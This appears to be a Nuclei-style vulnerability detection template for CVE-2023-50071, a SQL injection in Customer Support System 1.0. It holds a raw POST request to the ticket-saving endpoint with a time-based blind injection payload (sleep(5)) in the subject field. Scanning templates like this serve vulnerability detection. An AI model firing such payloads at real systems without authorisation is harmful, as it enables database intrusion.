id: CVE-2023-50071

info:
  name: Customer Support System 1.0 SQL Injection
  author: Anshu Bind
  severity: critical
  description: |
    Multiple SQL injection vulnerabilities in /customer_support/ajax.php?action=save_ticket in Customer Support System 1.0 allow authenticated attackers to execute arbitrary SQL commands via department_id, customer_id, and subject.
  tags: sql-injection,authenticated
  reference:
    - https://www.sourcecodester.com/php/14587/customer-support-system-using-phpmysqli-source-code.html
    - https://www.sourcecodester.com/download-code?nid=14587&title=Customer+Support+System+using+PHP%2FMySQLi+with+Source+Code

http:
  - raw:
      - |
        POST /customer_support/ajax.php?action=save_ticket HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0)
        Accept: */*
        X-Requested-With: XMLHttpRequest
        Content-Type: multipart/form-data; boundary=---------------------------81419250823331111993422505835
        Content-Length: 853
        Origin: {{BaseURL}}
        Connection: close
        Referer: {{BaseURL}}/customer_support/index.php?page=new_ticket
        Cookie: csrftoken=token_placeholder; sessionid=session_placeholder; PHPSESSID=session_placeholder

        -----------------------------81419250823331111993422505835
        Content-Disposition: form-data; name="id"

        
        -----------------------------81419250823331111993422505835
        Content-Disposition: form-data; name="subject"

        teste'+(select*from(select(sleep(5)))a)+'
        -----------------------------81419250823331111993422505835
        Content-Disposition: form-data; name="customer_id"

        3
        -----------------------------81419250823331111993422505835
        Content-Disposition: form-data; name="department_id"

        4
        -----------------------------81419250823331111993422505835
        Content-Disposition: form-data; name="description"

        <p>Blahs<br></p>
        -----------------------------81419250823331111993422505835
        Content-Disposition: form-data; name="files"; filename=""
        Content-Type: application/octet-stream


        -----------------------------81419250823331111993422505835--

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "5"
      - type: status
        status:
          - 200